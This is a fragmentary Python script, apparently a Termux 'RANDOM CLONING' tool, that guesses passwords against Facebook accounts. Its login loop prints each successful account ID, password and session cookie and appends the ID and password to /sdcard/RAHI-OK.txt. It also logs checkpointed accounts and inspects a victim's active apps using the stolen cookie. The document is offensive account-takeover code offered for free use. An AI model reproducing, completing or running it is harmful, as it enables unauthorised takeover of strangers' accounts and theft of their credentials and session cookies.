...
\x1b[1;97m[*]----------------------------------------------
\033[1;37m[*] Author        : Aizaz Rahi
\033[1;37m[*] Github        : 47_Rahi
\033[1;37m[*] Status        : FREE
\033[1;37m[*] TEAM          : Termux Free cmd
\033[1;37m[*] UPDATE BY     : AIZAZ-TEACH
\033[1;37m[*] Tools  Name   : RANDOM CLONING
\033[1;37m[*] version       : 0.5
\x1b[1;97m[*]----------------------------------------------
[*]----------------------------------------------
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r {GREEN}[Rahi] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
...
def free(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RAHI-,OK-😛]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [COOKIE] {coki}")
                open('/sdcard/RAHI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[RAHI-CP-]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|RAHI-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
